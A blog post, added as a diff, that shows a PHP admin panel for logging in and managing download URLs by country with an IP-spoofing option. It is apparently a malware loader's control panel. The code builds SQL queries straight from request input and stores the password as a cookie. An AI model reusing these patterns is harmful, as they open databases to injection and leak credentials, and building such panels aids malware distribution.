@@ -1,0 +1,161 @@
+---
+layout: post
+title: Rabbit
+tags:
+- Code Snippet
+status: publish
+type: post
+published: true
+meta:
+  aktt_notify_twitter: 'yes'
+  _aktt_hash_meta: ! '#secure #code #dev'
+  _edit_last: '2'
+  aktt_tweeted: '1'
+---
+<blockquote><strong>Silly rabbit, why you sweatin me?
+TuPac Shakur</strong></blockquote>
+<code lang="PHP">
+<?
+
+	include "common.php";
+
+	$luser = @$_POST['user'];
+	$lpass = @$_POST['pass'];
+	$login = @$_POST['login'];
+
+	$logined = false;
+
+	if ($login)
+	{
+    		Sleep(1);
+    		if ($luser == $user && $lpass == $pass)
+    		{
+        		setcookie("logined", $pass);
+        		header("location: index.php");
+    		}
+	} else {
+    		$logined = @$_COOKIE['logined'];
+    		if ($logined === $pass)
+    		{
+          		$logined = true;
+    		}
+	}
+
+?>
+<html>
+<head>
+<STYLE type=text/css>
+BODY {
+        BACKGROUND: #666666;
+        FONT: 11px Verdana, Arial
+}
+P {
+        FONT: 10pt Verdana, Arial;
+        COLOR: #000000;
+        TEXT-ALIGN: justify
+}
+TD {
+        FONT: 8pt Verdana,Arial;
+        COLOR: #000000
+}
+A {
+        COLOR: #000000;
+        TEXT-DECORATION: underline
+}
+A.nav {
+        COLOR: #000000; TEXT-DECORATION: none
+}
+A:hover {
+        BACKGROUND: silver; TEXT-DECORATION: underline overline
+}
+INPUT, SELECT, TEXTAREA {
+        FONT-SIZE: 8pt; FONT-FAMILY: Verdana, Helvetica;
+        border: 1px solid silver;
+        color: #606060;
+        background-color: #222222;
+        margin-top: 0px;
+        margin-bottom: 0px;
+}
+.HEAD TD {
+       BACKGROUND: silver; TEXT-ALIGN: center; FONT-WEIGHT: bold
+}
+.SLIST TD {
+        BACKGROUND: #888888
+}
+</STYLE>
+</head>
+<body>
+
+<script>
+function wnd( url )
+{
+        window.open( url, "", "statusbar=no,menubar=no,toolbar=no,scrollbars=yes,resizable=no,width=600,height=400");
+}
+</script>
+
+<?
+
+    	if (!$logined)
+    	{
+
+?>
+
+<form action=index.php method=POST>
+<table>
+<tr><td>user:</td><td><input type=text name=user></td></tr>
+<tr><td>pass:</td><td><input type=password name=pass></td></tr>
+<tr><td></td><td><input type=submit name=login value=login></td></tr>
+</table>
+</form>
+
+<?
+        	exit;
+	}
+
+	switch (@$_GET['d'])
+	{
+	case "add":
+        	if (empty($_POST['url']))
+			break;
+
+        	if (isset($_POST['country'])) $_POST['country'] = strtoupper($_POST['country']);
+
+        	$sql = "INSERT INTO `files`
+                	(`url`, `dnum`, `country`)
+                	VALUES
+                	('{$_POST['url']}', '".intval($_POST['dnum'])."', '{$_POST['country']}')
+        	";
+
+        	mysql_query($sql);
+        	header ("location: index.php");
+        	break;
+
+	case "del":
+        	if (!isset($_GET['id']))
+            		break;
+        
+		$sql = "DELETE FROM `files` WHERE `id`='{$_GET['id']}'";
+        	mysql_query($sql);
+        	header ("location: index.php");
+        	break;
+	}
+	
+	if (isset($_POST['opt']))
+	{
+		if (!isset($_POST['opt']['spoof_ip']))
+			$_POST['opt']['spoof_ip'] = 0;
+
+		foreach (array_keys($_POST['opt']) as $k)
+			mysql_query("REPLACE INTO `opt` (`name`, `value`) VALUES ('$k', '{$_POST['opt'][$k]}')");
+
+		header("location: index.php");
+	}
+
+	$bopt = array();
+
+	$r = mysql_query("SELECT * FROM `opt`");
+	while ($f = mysql_fetch_array($r))
+		$bopt[$f['name']] = $f['value'];
+
+?>
+</code>
